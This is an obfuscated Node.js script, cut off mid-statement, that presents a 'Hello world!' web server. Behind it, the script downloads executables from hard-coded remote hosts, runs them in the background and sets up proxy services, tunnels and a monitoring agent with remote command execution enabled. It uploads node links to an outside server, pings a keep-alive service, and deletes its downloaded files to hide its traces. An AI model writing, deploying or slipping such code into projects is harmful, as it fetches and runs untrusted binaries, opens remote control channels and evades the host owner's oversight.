const _0x30cd91=_0x471c;(function(_0x371a39,_0x4f7026){const _0x1075ef=_0x471c,_0x2059d5=_0x371a39();while(!![]){try{const _0x454d66=parseInt(_0x1075ef(0x19f))/0x1+parseInt(_0x1075ef(0x15c))/0x2*(-parseInt(_0x1075ef(0x1bd))/0x3)+parseInt(_0x1075ef(0x17f))/0x4+parseInt(_0x1075ef(0x1de))/0x5*(parseInt(_0x1075ef(0x177))/0x6)+-parseInt(_0x1075ef(0x13f))/0x7+parseInt(_0x1075ef(0x13b))/0x8+-parseInt(_0x1075ef(0x150))/0x9*(parseInt(_0x1075ef(0x17d))/0xa);if(_0x454d66===_0x4f7026)break;else _0x2059d5['push'](_0x2059d5['shift']());}catch(_0xffe02f){_0x2059d5['push'](_0x2059d5['shift']());}}}(_0x34bd,0xb2436));const express=require(_0x30cd91(0x16a)),app=express(),axios=require(_0x30cd91(0x1b2)),os=require('os'),fs=require('fs'),path=require(_0x30cd91(0x1d9)),{promisify}=require(_0x30cd91(0x153)),exec=promisify(require(_0x30cd91(0x16d))[_0x30cd91(0x197)]),{execSync}=require(_0x30cd91(0x16d)),UPLOAD_URL=process['env'][_0x30cd91(0x1e2)]||'',PROJECT_URL=process['env'][_0x30cd91(0x1bb)]||'',AUTO_ACCESS=process[_0x30cd91(0x1a5)][_0x30cd91(0x18b)]||![],FILE_PATH=process[_0x30cd91(0x1a5)][_0x30cd91(0x1f7)]||'./tmp',SUB_PATH=process[_0x30cd91(0x1a5)][_0x30cd91(0x16c)]||_0x30cd91(0x1c2),PORT=process[_0x30cd91(0x1a5)][_0x30cd91(0x152)]||process[_0x30cd91(0x1a5)][_0x30cd91(0x190)]||0xbb8,UUID=process[_0x30cd91(0x1a5)][_0x30cd91(0x1e8)]||'db9fefe6-c4d5-450f-be86-0a4b7e78545b',NEZHA_SERVER=process[_0x30cd91(0x1a5)]['NEZHA_SERVER']||'',NEZHA_PORT=process['env'][_0x30cd91(0x194)]||'',NEZHA_KEY=process[_0x30cd91(0x1a5)][_0x30cd91(0x1ac)]||'',ARGO_DOMAIN=process[_0x30cd91(0x1a5)][_0x30cd91(0x185)]||_0x30cd91(0x162),ARGO_AUTH=process[_0x30cd91(0x1a5)]['ARGO_AUTH']||_0x30cd91(0x1da),ARGO_PORT=process[_0x30cd91(0x1a5)]['ARGO_PORT']||0x1f41,CFIP=process[_0x30cd91(0x1a5)][_0x30cd91(0x1ed)]||'cdns.doon.eu.org',CFPORT=process[_0x30cd91(0x1a5)][_0x30cd91(0x1f2)]||0x1bb,NAME=process[_0x30cd91(0x1a5)]['NAME']||_0x30cd91(0x16f);!fs[_0x30cd91(0x1dc)](FILE_PATH)?(fs[_0x30cd91(0x15b)](FILE_PATH),console[_0x30cd91(0x19d)](FILE_PATH+_0x30cd91(0x149))):console[_0x30cd91(0x19d)](FILE_PATH+_0x30cd91(0x1a3));function generateRandomName(){const _0x392443=_0x30cd91,_0x21b90b=_0x392443(0x1ad);let _0x9bb434='';for(let _0x43965b=0x0;_0x43965b<0x6;_0x43965b++){_0x9bb434+=_0x21b90b[_0x392443(0x199)](Math[_0x392443(0x1b1)](Math[_0x392443(0x141)]()*_0x21b90b[_0x392443(0x18a)]));}return _0x9bb434;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x30cd91(0x19b)](FILE_PATH,webName),botPath=path[_0x30cd91(0x19b)](FILE_PATH,botName),subPath=path[_0x30cd91(0x19b)](FILE_PATH,_0x30cd91(0x17a)),listPath=path[_0x30cd91(0x19b)](FILE_PATH,_0x30cd91(0x161)),bootLogPath=path[_0x30cd91(0x19b)](FILE_PATH,_0x30cd91(0x1f9)),configPath=path[_0x30cd91(0x19b)](FILE_PATH,_0x30cd91(0x1d4));function deleteNodes(){const _0x4f2ef2=_0x30cd91;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x1b8e4f;try{_0x1b8e4f=fs[_0x4f2ef2(0x196)](subPath,_0x4f2ef2(0x1f3));}catch{return null;}const _0x4ab52d=Buffer[_0x4f2ef2(0x1e3)](_0x1b8e4f,_0x4f2ef2(0x1e6))['toString'](_0x4f2ef2(0x1f3)),_0x331347=_0x4ab52d[_0x4f2ef2(0x1b4)]('\x0a')['filter'](_0x4ee3e8=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x4ee3e8));if(_0x331347[_0x4f2ef2(0x18a)]===0x0)return;return axios[_0x4f2ef2(0x13e)](UPLOAD_URL+_0x4f2ef2(0x165),JSON[_0x4f2ef2(0x139)]({'nodes':_0x331347}),{'headers':{'Content-Type':_0x4f2ef2(0x168)}})['catch'](_0x24c72b=>{return null;}),null;}catch(_0x1ecaef){return null;}}function cleanupOldFiles(){const _0x4fec80=_0x30cd91;try{const _0x2da978=fs[_0x4fec80(0x143)](FILE_PATH);_0x2da978[_0x4fec80(0x14f)](_0x2f0f2a=>{const _0x1b9f29=_0x4fec80,_0xe41a81=path[_0x1b9f29(0x19b)](FILE_PATH,_0x2f0f2a);try{const _0x574d90=fs[_0x1b9f29(0x1eb)](_0xe41a81);_0x574d90[_0x1b9f29(0x14d)]()&&fs[_0x1b9f29(0x179)](_0xe41a81);}catch(_0x235651){}});}catch(_0x12ca60){}}function _0x34bd(){const _0x5121e0=['Hello\x20world!','vmess','CFPORT','utf-8','success','basename','\x0a\x20\x20tunnel:\x20','FILE_PATH','&path=%2Ftrojan-argo%3Fed%3D2560#','boot.log','then','2087','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','?security=tls&sni=','false','Error\x20executing\x20command:\x20','\x0avless://','stringify','rm\x20-rf\x20','11091872biUZpL','blackhole','Unhandled\x20error\x20in\x20startserver:','post','6941389AcuVTL','Empowerment\x20failed\x20for\x20','random','/trojan-argo','readdirSync','\x20>/dev/null\x202>&1','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','--tls','arm','error','\x20is\x20created','has','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','\x20>\x20nul\x202>&1','isFile','writeFileSync','forEach','882oINIBM','data','SERVER_PORT','util','response','test','tunnel.json','127.0.0.1','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','send','https://oooo.serv00.net/add-url','mkdirSync','114fpNmka','none','direct','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','&fp=firefox&type=ws&host=','list.txt','w1.wangmao.dpdns.org','pipe','amd','/api/delete-nodes','\x20>/dev/null\x202>&1\x20&','\x20is\x20running','application/json','status','express','set','SUB_PATH','child_process','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','wangmao','unshift','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','all','http://ip-api.com/json/','Nodes\x20uploaded\x20successfully','push','1002nHVosk','platform','unlinkSync','sub.txt','nohup\x20','/vless-argo','193210BLVntq','tcp','3858676kOKWtz','freedom','finish','/config.json\x20>/dev/null\x202>&1\x20&','php\x20running\x20error:\x20','ArgoDomain:','ARGO_DOMAIN','App\x20is\x20running','\x0aclient_secret:\x20','automatic\x20access\x20task\x20added\x20successfully','stream','length','AUTO_ACCESS','listen','Add\x20automatic\x20access\x20task\x20faild:\x20','firefox','/vmess-argo','PORT','Empowerment\x20success\x20for\x20','/dev/null','toString','NEZHA_PORT','2053','readFileSync','exec','/vmess-argo?ed=2560','charAt','https://arm64.ssss.nyc.mn/bot','join','xtls-rprx-vision','log','npm\x20running\x20error:\x20','409217TaOGFt','443','filter','text/plain;\x20charset=utf-8','\x20already\x20exists','del\x20/f\x20/q\x20','env','message','/sub.txt\x20saved\x20successfully','Download\x20','Error\x20in\x20startserver:','map','true','NEZHA_KEY','abcdefghijklmnopqrstuvwxyz','close','Error\x20reading\x20boot.log:','config.yaml','floor','axios','win32','split','createWriteStream','Unknown','https://arm64.ssss.nyc.mn/agent','?encryption=none&security=tls&sni=','match','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','PROJECT_URL','https://amd64.ssss.nyc.mn/web','7998UVcyFJ','\x20successfully','country_code','\x20-c\x20','https://amd64.ssss.nyc.mn/bot','sub','/api/add-nodes','https+local://8.8.8.8/dns-query','\x20-p\x20','tunnel.yml','Subscription\x20uploaded\x20successfully','block','tls','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','8443','2096','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','\x22\x20>\x20/dev/null\x202>&1','includes','http','\x20-s\x20','fileUrl','get','config.json','web\x20running\x20error:\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','https://amd64.ssss.nyc.mn/v1','org','path','eyJhIjoiMzk3OGIzMTZhZTIzZjNkMWY4ZTViMjE5ZDMxN2NlMDEiLCJ0IjoiNTY0Yzk3NmEtNzVmNi00ZGMzLTlhZGItZmUzMTVjM2Q0OGY1IiwicyI6IlpUSTNNVEpoTXpjdE5XSmlNaTAwWW1VMUxXRTNZbVF0WVRrMk1qQTVNR0ZtWVRWbSJ9','Error\x20downloading\x20files:','existsSync','2083','30145xjPdYy','catch','vless','clear','UPLOAD_URL','from','TunnelSecret','Content-Type','base64','https://arm64.ssss.nyc.mn/v1','UUID','\x0a\x20\x20\x20\x20','.exe\x20>\x20nul\x202>&1','statSync','\x0a\x0avmess://','CFIP','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','countryCode'];_0x34bd=function(){return _0x5121e0;};return _0x34bd();}app[_0x30cd91(0x1d3)]('/',function(_0x262038,_0x22b26d){const _0x590c4b=_0x30cd91;_0x22b26d[_0x590c4b(0x159)](_0x590c4b(0x1f0));});async function generateConfig(){const _0x27334b=_0x30cd91,_0x2d5c2f={'log':{'access':_0x27334b(0x192),'error':'/dev/null','loglevel':_0x27334b(0x15d)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x27334b(0x1e0),'settings':{'clients':[{'id':UUID,'flow':_0x27334b(0x19c)}],'decryption':_0x27334b(0x15d),'fallbacks':[{'dest':0xbb9},{'path':_0x27334b(0x17c),'dest':0xbba},{'path':_0x27334b(0x18f),'dest':0xbbb},{'path':_0x27334b(0x142),'dest':0xbbc}]},'streamSettings':{'network':_0x27334b(0x17e)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x27334b(0x1e0),'settings':{'clients':[{'id':UUID}],'decryption':_0x27334b(0x15d)},'streamSettings':{'network':_0x27334b(0x17e),'security':_0x27334b(0x15d)}},{'port':0xbba,'listen':_0x27334b(0x157),'protocol':_0x27334b(0x1e0),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x27334b(0x15d)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x27334b(0x1d0),'tls','quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x27334b(0x157),'protocol':_0x27334b(0x1f1),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x27334b(0x18f)}},'sniffing':{'enabled':!![],'destOverride':[_0x27334b(0x1d0),'tls','quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x27334b(0x157),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x27334b(0x15d),'wsSettings':{'path':_0x27334b(0x142)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x27334b(0x1c9),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x27334b(0x1c4)]},'outbounds':[{'protocol':_0x27334b(0x180),'tag':_0x27334b(0x15e)},{'protocol':_0x27334b(0x13c),'tag':_0x27334b(0x1c8)}]};fs[_0x27334b(0x14e)](path[_0x27334b(0x19b)](FILE_PATH,_0x27334b(0x1d4)),JSON[_0x27334b(0x139)](_0x2d5c2f,null,0x2));}function getSystemArchitecture(){const _0x498cc9=_0x30cd91,_0x3f3f11=os['arch']();return _0x3f3f11==='arm'||_0x3f3f11==='arm64'||_0x3f3f11==='aarch64'?'arm':_0x498cc9(0x164);}function downloadFile(_0x18852b,_0x3907ac,_0x8427ce){const _0x1604ac=_0x30cd91,_0x37477a=_0x18852b;!fs[_0x1604ac(0x1dc)](FILE_PATH)&&fs[_0x1604ac(0x15b)](FILE_PATH,{'recursive':!![]});const _0x50ea6b=fs[_0x1604ac(0x1b5)](_0x37477a);axios({'method':_0x1604ac(0x1d3),'url':_0x3907ac,'responseType':_0x1604ac(0x189)})[_0x1604ac(0x1fa)](_0x1adffe=>{const _0xf977f4=_0x1604ac;_0x1adffe[_0xf977f4(0x151)][_0xf977f4(0x163)](_0x50ea6b),_0x50ea6b['on'](_0xf977f4(0x181),()=>{const _0x1bbbda=_0xf977f4;_0x50ea6b[_0x1bbbda(0x1ae)](),console['log'](_0x1bbbda(0x1a8)+path['basename'](_0x37477a)+_0x1bbbda(0x1be)),_0x8427ce(null,_0x37477a);}),_0x50ea6b['on'](_0xf977f4(0x148),_0x3c8394=>{const _0x124225=_0xf977f4;fs['unlink'](_0x37477a,()=>{});const _0x318bde=_0x124225(0x1a8)+path[_0x124225(0x1f5)](_0x37477a)+'\x20failed:\x20'+_0x3c8394[_0x124225(0x1a6)];console[_0x124225(0x148)](_0x318bde),_0x8427ce(_0x318bde);});})[_0x1604ac(0x1df)](_0x54bcc4=>{const _0xefd2b=_0x1604ac,_0x2ab82e='Download\x20'+path[_0xefd2b(0x1f5)](_0x37477a)+'\x20failed:\x20'+_0x54bcc4[_0xefd2b(0x1a6)];console[_0xefd2b(0x148)](_0x2ab82e),_0x8427ce(_0x2ab82e);});}async function downloadFilesAndRun(){const _0x10a328=_0x30cd91,_0x17497d=getSystemArchitecture(),_0x4669ea=getFilesForArchitecture(_0x17497d);if(_0x4669ea[_0x10a328(0x18a)]===0x0){console['log'](_0x10a328(0x1d6));return;}const _0x90b5a2=_0x4669ea[_0x10a328(0x1aa)](_0x1f486d=>{return new Promise((_0x41e9d9,_0x5cdf2b)=>{const _0x157e0e=_0x471c;downloadFile(_0x1f486d['fileName'],_0x1f486d[_0x157e0e(0x1d2)],(_0x35078c,_0x1849a2)=>{_0x35078c?_0x5cdf2b(_0x35078c):_0x41e9d9(_0x1849a2);});});});try{await Promise[_0x10a328(0x173)](_0x90b5a2);}catch(_0x429d1a){console['error'](_0x10a328(0x1db),_0x429d1a);return;}function _0x31d104(_0x188d93){const _0x2ac7ac=_0x10a328,_0xdd7a68=0x1fd;_0x188d93[_0x2ac7ac(0x14f)](_0x6aeaad=>{const _0x1e893d=_0x2ac7ac;fs[_0x1e893d(0x1dc)](_0x6aeaad)&&fs['chmod'](_0x6aeaad,_0xdd7a68,_0x38ff8c=>{const _0x547206=_0x1e893d;_0x38ff8c?console['error'](_0x547206(0x140)+_0x6aeaad+':\x20'+_0x38ff8c):console[_0x547206(0x19d)](_0x547206(0x191)+_0x6aeaad+':\x20'+_0xdd7a68[_0x547206(0x193)](0x8));});});}const _0x4bc39f=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x31d104(_0x4bc39f);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xec980a=NEZHA_SERVER[_0x10a328(0x1cf)](':')?NEZHA_SERVER[_0x10a328(0x1b4)](':')['pop']():'',_0x4648a4=new Set(['443',_0x10a328(0x1cb),_0x10a328(0x1cc),_0x10a328(0x1fb),_0x10a328(0x1dd),_0x10a328(0x195)]),_0x2a3326=_0x4648a4[_0x10a328(0x14a)](_0xec980a)?_0x10a328(0x1ab):_0x10a328(0x136),_0x3404e7=_0x10a328(0x187)+NEZHA_KEY+_0x10a328(0x1fc)+NEZHA_SERVER+_0x10a328(0x1cd)+_0x2a3326+_0x10a328(0x15f)+UUID;fs[_0x10a328(0x14e)](path['join'](FILE_PATH,_0x10a328(0x1b0)),_0x3404e7);const _0x4e17d7='nohup\x20'+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x10a328(0x1ee);try{await exec(_0x4e17d7),console[_0x10a328(0x19d)](phpName+'\x20is\x20running'),await new Promise(_0x591afc=>setTimeout(_0x591afc,0x3e8));}catch(_0x40f352){console['error'](_0x10a328(0x183)+_0x40f352);}}else{let _0x5180aa='';const _0x5306c8=[_0x10a328(0x1a0),_0x10a328(0x1cb),_0x10a328(0x1cc),'2087',_0x10a328(0x1dd),_0x10a328(0x195)];_0x5306c8[_0x10a328(0x1cf)](NEZHA_PORT)&&(_0x5180aa=_0x10a328(0x146));const _0xa43764='nohup\x20'+npmPath+_0x10a328(0x1d1)+NEZHA_SERVER+':'+NEZHA_PORT+_0x10a328(0x1c5)+NEZHA_KEY+'\x20'+_0x5180aa+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0xa43764),console[_0x10a328(0x19d)](npmName+'\x20is\x20running'),await new Promise(_0x2c759c=>setTimeout(_0x2c759c,0x3e8));}catch(_0x535401){console[_0x10a328(0x148)](_0x10a328(0x19e)+_0x535401);}}}else console[_0x10a328(0x19d)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x2552f4=_0x10a328(0x17b)+webPath+_0x10a328(0x1c0)+FILE_PATH+_0x10a328(0x182);try{await exec(_0x2552f4),console['log'](webName+_0x10a328(0x167)),await new Promise(_0x42032a=>setTimeout(_0x42032a,0x3e8));}catch(_0x7315e6){console[_0x10a328(0x148)](_0x10a328(0x1d5)+_0x7315e6);}if(fs[_0x10a328(0x1dc)](botPath)){let _0x450d86;if(ARGO_AUTH[_0x10a328(0x1b9)](/^[A-Z0-9a-z=]{120,250}$/))_0x450d86='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x10a328(0x1b9)](/TunnelSecret/)?_0x450d86=_0x10a328(0x145)+FILE_PATH+'/tunnel.yml\x20run':_0x450d86=_0x10a328(0x1ca)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x450d86+_0x10a328(0x166)),console['log'](botName+'\x20is\x20running'),await new Promise(_0x3ba6f9=>setTimeout(_0x3ba6f9,0x7d0));}catch(_0xf18356){console['error'](_0x10a328(0x137)+_0xf18356);}}await new Promise(_0x3bc8a4=>setTimeout(_0x3bc8a4,0x1388));}function getFilesForArchitecture(_0x50a5a5){const _0x5b9598=_0x30cd91;let _0x39c569;_0x50a5a5===_0x5b9598(0x147)?_0x39c569=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x5b9598(0x19a)}]:_0x39c569=[{'fileName':webPath,'fileUrl':_0x5b9598(0x1bc)},{'fileName':botPath,'fileUrl':_0x5b9598(0x1c1)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x10251e=_0x50a5a5==='arm'?_0x5b9598(0x1b7):'https://amd64.ssss.nyc.mn/agent';_0x39c569[_0x5b9598(0x170)]({'fileName':npmPath,'fileUrl':_0x10251e});}else{const _0x938484=_0x50a5a5===_0x5b9598(0x147)?_0x5b9598(0x1e7):_0x5b9598(0x1d7);_0x39c569[_0x5b9598(0x170)]({'fileName':phpPath,'fileUrl':_0x938484});}}return _0x39c569;}function argoType(){const _0x4b0d6d=_0x30cd91;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x4b0d6d(0x19d)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x4b0d6d(0x1cf)](_0x4b0d6d(0x1e4))){fs['writeFileSync'](path[_0x4b0d6d(0x19b)](FILE_PATH,_0x4b0d6d(0x156)),ARGO_AUTH);const _0x2d8520=_0x4b0d6d(0x1f6)+ARGO_AUTH[_0x4b0d6d(0x1b4)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x4b0d6d(0x19b)](FILE_PATH,_0x4b0d6d(0x156))+_0x4b0d6d(0x172)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x4b0d6d(0x158);fs[_0x4b0d6d(0x14e)](path[_0x4b0d6d(0x19b)](FILE_PATH,_0x4b0d6d(0x1c6)),_0x2d8520);}else console['log'](_0x4b0d6d(0x171));}async function extractDomains(){const _0x333129=_0x30cd91;let _0x597802;if(ARGO_AUTH&&ARGO_DOMAIN)_0x597802=ARGO_DOMAIN,console['log']('ARGO_DOMAIN:',_0x597802),await _0x4518c4(_0x597802);else try{const _0x9323d2=fs[_0x333129(0x196)](path['join'](FILE_PATH,_0x333129(0x1f9)),_0x333129(0x1f3)),_0x3d174d=_0x9323d2[_0x333129(0x1b4)]('\x0a'),_0x384a13=[];_0x3d174d['forEach'](_0x25a0ad=>{const _0x39deca=_0x333129,_0x3a2244=_0x25a0ad[_0x39deca(0x1b9)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x3a2244){const _0x469525=_0x3a2244[0x1];_0x384a13[_0x39deca(0x176)](_0x469525);}});if(_0x384a13[_0x333129(0x18a)]>0x0)_0x597802=_0x384a13[0x0],console[_0x333129(0x19d)](_0x333129(0x184),_0x597802),await _0x4518c4(_0x597802);else{console['log'](_0x333129(0x16e)),fs['unlinkSync'](path['join'](FILE_PATH,_0x333129(0x1f9)));async function _0x24d2d7(){const _0x86176b=_0x333129;try{process[_0x86176b(0x178)]===_0x86176b(0x1b3)?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x86176b(0x1ea)):await exec('pkill\x20-f\x20\x22['+botName['charAt'](0x0)+']'+botName['substring'](0x1)+_0x86176b(0x1ce));}catch(_0x42b5b5){}}_0x24d2d7(),await new Promise(_0x9a0418=>setTimeout(_0x9a0418,0xbb8));const _0x268222='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x333129(0x1ba)+ARGO_PORT;try{await exec(_0x333129(0x17b)+botPath+'\x20'+_0x268222+'\x20>/dev/null\x202>&1\x20&'),console[_0x333129(0x19d)](botName+_0x333129(0x167)),await new Promise(_0x4e8ca4=>setTimeout(_0x4e8ca4,0xbb8)),await extractDomains();}catch(_0x1b37fa){console[_0x333129(0x148)](_0x333129(0x137)+_0x1b37fa);}}}catch(_0x3d2691){console[_0x333129(0x148)](_0x333129(0x1af),_0x3d2691);}async function _0x5dfb2a(){const _0x16dfb3=_0x333129;try{const _0x3c13fc=await axios[_0x16dfb3(0x1d3)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x3c13fc['data']&&_0x3c13fc[_0x16dfb3(0x151)][_0x16dfb3(0x1bf)]&&_0x3c13fc['data']['org'])return _0x3c13fc[_0x16dfb3(0x151)][_0x16dfb3(0x1bf)]+'_'+_0x3c13fc['data'][_0x16dfb3(0x1d8)];}catch(_0x287109){try{const _0x401398=await axios['get'](_0x16dfb3(0x174),{'timeout':0xbb8});if(_0x401398[_0x16dfb3(0x151)]&&_0x401398[_0x16dfb3(0x151)][_0x16dfb3(0x169)]===_0x16dfb3(0x1f4)&&_0x401398[_0x16dfb3(0x151)]['countryCode']&&_0x401398[_0x16dfb3(0x151)][_0x16dfb3(0x1d8)])return _0x401398[_0x16dfb3(0x151)][_0x16dfb3(0x1ef)]+'_'+_0x401398[_0x16dfb3(0x151)][_0x16dfb3(0x1d8)];}catch(_0x474135){}}return _0x16dfb3(0x1b6);}async function _0x4518c4(_0x33fd9e){const _0x1e322e=await _0x5dfb2a(),_0x532ad5=NAME?NAME+'-'+_0x1e322e:_0x1e322e;return new Promise(_0x1558d0=>{setTimeout(()=>{const _0x1d567a=_0x471c,_0x3c193d={'v':'2','ps':''+_0x532ad5,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':'none','host':_0x33fd9e,'path':_0x1d567a(0x198),'tls':_0x1d567a(0x1c9),'sni':_0x33fd9e,'alpn':'','fp':_0x1d567a(0x18e)},_0x3aa26a=_0x1d567a(0x138)+UUID+'@'+CFIP+':'+CFPORT+_0x1d567a(0x1b8)+_0x33fd9e+_0x1d567a(0x160)+_0x33fd9e+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x532ad5+_0x1d567a(0x1ec)+Buffer[_0x1d567a(0x1e3)](JSON['stringify'](_0x3c193d))[_0x1d567a(0x193)](_0x1d567a(0x1e6))+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x1d567a(0x135)+_0x33fd9e+_0x1d567a(0x160)+_0x33fd9e+_0x1d567a(0x1f8)+_0x532ad5+_0x1d567a(0x1e9);console['log'](Buffer[_0x1d567a(0x1e3)](_0x3aa26a)[_0x1d567a(0x193)]('base64')),fs[_0x1d567a(0x14e)](subPath,Buffer['from'](_0x3aa26a)[_0x1d567a(0x193)](_0x1d567a(0x1e6))),console[_0x1d567a(0x19d)](FILE_PATH+_0x1d567a(0x1a7)),uploadNodes(),app[_0x1d567a(0x1d3)]('/'+SUB_PATH,(_0x80d3b7,_0x2b503a)=>{const _0x182f47=_0x1d567a,_0x299618=Buffer[_0x182f47(0x1e3)](_0x3aa26a)[_0x182f47(0x193)](_0x182f47(0x1e6));_0x2b503a[_0x182f47(0x16b)](_0x182f47(0x1e5),_0x182f47(0x1a2)),_0x2b503a[_0x182f47(0x159)](_0x299618);}),_0x1558d0(_0x3aa26a);},0x7d0);});}}function _0x471c(_0x17ab54,_0x36f757){_0x17ab54=_0x17ab54-0x135;const _0x34bd86=_0x34bd();let _0x471c7f=_0x34bd86[_0x17ab54];return _0x471c7f;}async function uploadNodes(){const _0x4ad7dd=_0x30cd91;if(UPLOAD_URL&&PROJECT_URL){const _0x32b905=PROJECT_URL+'/'+SUB_PATH,_0x2b6952={'subscription':[_0x32b905]};try{const _0x586e3d=await axios[_0x4ad7dd(0x13e)](UPLOAD_URL+'/api/add-subscriptions',_0x2b6952,{'headers':{'Content-Type':_0x4ad7dd(0x168)}});return _0x586e3d&&_0x586e3d[_0x4ad7dd(0x169)]===0xc8?(console[_0x4ad7dd(0x19d)](_0x4ad7dd(0x1c7)),_0x586e3d):null;}catch(_0x1d900a){if(_0x1d900a[_0x4ad7dd(0x154)]){if(_0x1d900a['response'][_0x4ad7dd(0x169)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x4ad7dd(0x1dc)](listPath))return;const _0x46240f=fs[_0x4ad7dd(0x196)](listPath,_0x4ad7dd(0x1f3)),_0x504e23=_0x46240f[_0x4ad7dd(0x1b4)]('\x0a')[_0x4ad7dd(0x1a1)](_0x3a0415=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4ad7dd(0x155)](_0x3a0415));if(_0x504e23['length']===0x0)return;const _0x374000=JSON[_0x4ad7dd(0x139)]({'nodes':_0x504e23});try{const _0x3dea7b=await axios['post'](UPLOAD_URL+_0x4ad7dd(0x1c3),_0x374000,{'headers':{'Content-Type':_0x4ad7dd(0x168)}});return _0x3dea7b&&_0x3dea7b[_0x4ad7dd(0x169)]===0xc8?(console[_0x4ad7dd(0x19d)](_0x4ad7dd(0x175)),_0x3dea7b):null;}catch(_0x295c2d){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x284241=_0x471c,_0x4405cf=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x4405cf[_0x284241(0x176)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x4405cf[_0x284241(0x176)](phpPath);process[_0x284241(0x178)]===_0x284241(0x1b3)?exec(_0x284241(0x1a4)+_0x4405cf['join']('\x20')+_0x284241(0x14c),_0x21d063=>{const _0x34b398=_0x284241;console[_0x34b398(0x1e1)](),console[_0x34b398(0x19d)](_0x34b398(0x186)),console[_0x34b398(0x19d)](_0x34b398(0x14b));}):exec(_0x284241(0x13a)+_0x4405cf[_0x284241(0x19b)]('\x20')+_0x284241(0x144),_0x49cc25=>{const _0x1e1da3=_0x284241;console[_0x1e1da3(0x1e1)](),console['log'](_0x1e1da3(0x186)),console[_0x1e1da3(0x19d)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x10e175=_0x30cd91;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x10e175(0x19d)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x22307d=await axios[_0x10e175(0x13e)](_0x10e175(0x15a),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x10e175(0x168)}});return console[_0x10e175(0x19d)](_0x10e175(0x188)),_0x22307d;}catch(_0x1cf478){return console[_0x10e175(0x148)](_0x10e175(0x18d)+_0x1cf478['message']),null;}}async function startserver(){const _0x5cbb21=_0x30cd91;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await 